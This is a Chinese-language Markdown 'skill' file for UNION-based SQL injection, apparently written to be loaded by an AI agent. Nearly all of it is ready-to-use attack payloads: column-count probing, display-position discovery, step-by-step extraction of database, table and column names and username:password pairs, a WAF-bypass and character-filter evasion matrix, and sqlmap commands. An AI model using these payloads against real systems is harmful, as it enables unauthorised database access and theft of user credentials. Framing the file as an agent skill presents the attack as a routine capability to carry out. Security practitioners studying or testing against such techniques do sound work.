---
name: sqli-union
description: Use when encountering 联合查询注入技术 - 列数探测、显示位确定、数据提取
---

# SQL注入攻击

## Info

- **Domain**: web
- **Tags**: web, sqli, union, database

# 联合查询注入攻击

## 攻击思路
```
确定注入点 → 判断列数 → 确定显示位 → 提取数据 → 绕过限制
```

## 列数探测

| 方法 | Payload | 说明 |
|------|---------|------|
| ORDER BY递增 | ORDER BY 1/2/3... | 报错则确定列数 |
| UNION NULL填充 | UNION SELECT NULL,NULL... | 匹配列数不报错 |

```sql
-- ORDER BY探测
' ORDER BY 1--   # 正常
' ORDER BY 2--   # 正常
' ORDER BY 3--   # 报错 → 共2列

-- UNION NULL探测
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--  # 正常 → 共3列
```

## 显示位确定

```sql
-- 数字标记显示位
' UNION SELECT 1,2,3--

-- 字符标记
' UNION SELECT 'a','b','c'--

-- 观察页面回显,确定哪些列被显示
-- 如页面显示 '2', 则第2列可利用
```

## 数据提取流程

```sql
-- Step1: 获取版本
' UNION SELECT 1,@@version,3--

-- Step2: 获取数据库
' UNION SELECT 1,database(),3--

-- Step3: 获取用户
' UNION SELECT 1,user(),3--

-- Step4: 枚举表名
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()--

-- Step5: 枚举列名
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--

-- Step6: 提取数据
' UNION SELECT 1,concat(username,':',password),3 FROM users--
```

## WAF绕过矩阵

| 绕过类型 | Payload | 说明 |
|----------|---------|------|
| 内联注释 | UNION/**/SELECT/**/ | 绕过空格过滤 |
| 大小写混合 | UnIoN SeLeCt | 绕过大小写检测 |
| URL编码 | %55%4e%49%4f%4e | 绕过关键词 |
| 双URL编码 | %25%35%35 | 二次解码 |
| NULL替代 | UNION SELECT NULL,NULL | 绕过数字过滤 |
| 括号替代 | UNION(SELECT(1),(2)) | 绕过空格 |

```sql
-- 内联注释
'/**/UNION/**/SELECT/**/1,2,3--

-- 大小写混淆
' UnIoN SeLeCt 1,2,3--

-- 括号替代空格
'UNION(SELECT(1),(2),(3))--

-- Hex编码字符串
' UNION SELECT 1,0x61646d696e,3--  # 0x61646d696e = 'admin'

-- URL编码
' UNION SELECT 1,%27admin%27,3--
```

## 特殊字符绕过

| 过滤字符 | 绕过方法 |
|----------|----------|
| 引号 | 使用Hex或CHR函数 |
| 空格 | 使用/**/或%09%0a等 |
| 逗号 | 使用JOIN或OFFSET |
| 等号 | 使用LIKE或IN |

```sql
-- 绕过引号
' UNION SELECT 1,0x61646d696e,3--  # hex编码
' UNION SELECT 1,CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110),3--  # chr函数

-- 绕过逗号
' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c--

-- 绕过等号
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema LIKE database()--
```

## 多行数据提取

```sql
-- GROUP_CONCAT合并
' UNION SELECT 1,GROUP_CONCAT(username,':',password),3 FROM users--

-- 多次查询
' UNION SELECT 1,username,password FROM users LIMIT 0,1--
' UNION SELECT 1,username,password FROM users LIMIT 1,1--

-- 条件过滤
' UNION SELECT 1,username,password FROM users WHERE id=1--
```

## 不同数据库语法

| 数据库 | 版本函数 | 当前库 | 用户 |
|--------|----------|--------|------|
| MySQL | @@version | database() | user() |
| MSSQL | @@version | DB_NAME() | USER_NAME() |
| PostgreSQL | version() | current_database() | current_user |
| Oracle | v$version | global_name | user |
| SQLite | sqlite_version() | - | - |

## 自动化工具

```bash
# sqlmap联合查询注入
sqlmap -u "http://target?id=1" --technique=U --batch

# 指定列数
sqlmap -u "http://target?id=1" --union-cols=3

# 指定字符
sqlmap -u "http://target?id=1" --union-char=NULL
```